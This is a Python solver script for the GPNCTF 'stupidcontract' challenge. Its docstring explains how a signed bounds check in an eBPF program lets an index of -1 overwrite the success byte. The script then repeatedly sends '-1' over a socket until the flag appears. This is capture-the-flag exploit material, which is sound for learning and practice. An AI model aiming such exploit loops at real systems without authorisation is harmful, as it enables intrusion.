#!/usr/bin/env python3
"""
Solver for GPNCTF stupidcontract.

Exploit idea: send -1 for every reservation prompt. The eBPF program checks only
`idx > 99` using a signed comparison, so idx=-1 is accepted and writes to
DATA[idx+1] == DATA[0], the success byte. The random branch succeeds with ~20%
probability each try; 300 tries makes success overwhelmingly likely.
"""
import argparse
import re
import socket
import ssl
import sys
import time

FLAG_RE = re.compile(rb"GPNCTF\{[^}\r\n]+\}")


def recv_for(sock, timeout: float) -> bytes:
    """Receive whatever is currently available for up to timeout seconds."""
    end = time.time() + timeout
    data = bytearray()
    sock.setblocking(False)
    try:
        while time.time() < end:
            try:
                chunk = sock.recv(4096)
                if chunk:
                    data += chunk
                    # After getting output, keep a short grace period for the rest.
                    end = max(end, time.time() + 0.05)
                    if FLAG_RE.search(data):
                        break
                else:
                    break
            except (BlockingIOError, ssl.SSLWantReadError):
                time.sleep(0.02)
    finally:
        sock.setblocking(True)
    return bytes(data)


def connect(host: str, port: int, use_ssl: bool, timeout: float):
    raw = socket.create_connection((host, port), timeout=timeout)
    if not use_ssl:
        return raw
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx.wrap_socket(raw, server_hostname=host)


def main() -> int:
    ap = argparse.ArgumentParser(description="Exploit stupidcontract")
    ap.add_argument("host", help="target host, e.g. 127.0.0.1")
    ap.add_argument("port", type=int, help="target port, e.g. 1337")
    ap.add_argument("--ssl", action="store_true", help="wrap the TCP connection with TLS")
    ap.add_argument("-n", "--count", type=int, default=300, help="number of -1 attempts, default 300")
    ap.add_argument("--timeout", type=float, default=15.0, help="socket connection timeout")
    args = ap.parse_args()

    s = connect(args.host, args.port, args.ssl, args.timeout)
    transcript = bytearray()

    transcript += recv_for(s, 3.0)
    for i in range(args.count):
        s.sendall(b"-1\n")
        transcript += recv_for(s, 0.20 if i + 1 < args.count else 4.0)
        m = FLAG_RE.search(transcript)
        if m:
            flag = m.group(0).decode()
            print(flag)
            print("\n[proof] target output around the flag:")
            proof = transcript[max(0, m.start() - 300):m.end() + 300]
            print(proof.decode(errors="replace"))
            return 0

    transcript += recv_for(s, 8.0)
    m = FLAG_RE.search(transcript)
    if m:
        flag = m.group(0).decode()
        print(flag)
        print("\n[proof] target output around the flag:")
        proof = transcript[max(0, m.start() - 300):m.end() + 300]
        print(proof.decode(errors="replace"))
        return 0

    print("[!] no flag found. Transcript tail:", file=sys.stderr)
    print(bytes(transcript[-5000:]).decode(errors="replace"), file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
